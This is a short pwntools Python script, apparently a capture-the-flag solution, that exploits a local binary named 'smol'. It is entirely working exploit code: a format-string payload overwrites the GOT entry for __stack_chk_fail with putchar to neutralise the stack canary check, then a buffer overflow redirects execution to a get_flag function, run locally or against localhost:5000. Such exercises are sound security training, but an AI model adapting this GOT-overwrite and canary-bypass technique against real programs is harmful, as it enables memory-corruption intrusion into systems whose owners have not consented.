#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/smol'

e = ELF('./build/smol')
rop = ROP('./build/smol')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5000)
else:
    p = e.process()

#payload = cyclic(112) + p64(0xdeadbeef) + b'|%19$lx'
writes = { e.got['__stack_chk_fail'] : e.sym['putchar'] }
got_payload = cyclic(112) + fmtstr_payload(20, writes) + flat({168: e.sym['get_flag']})

p.sendline(got_payload)
p.sendline(b'skip')
p.interactive()
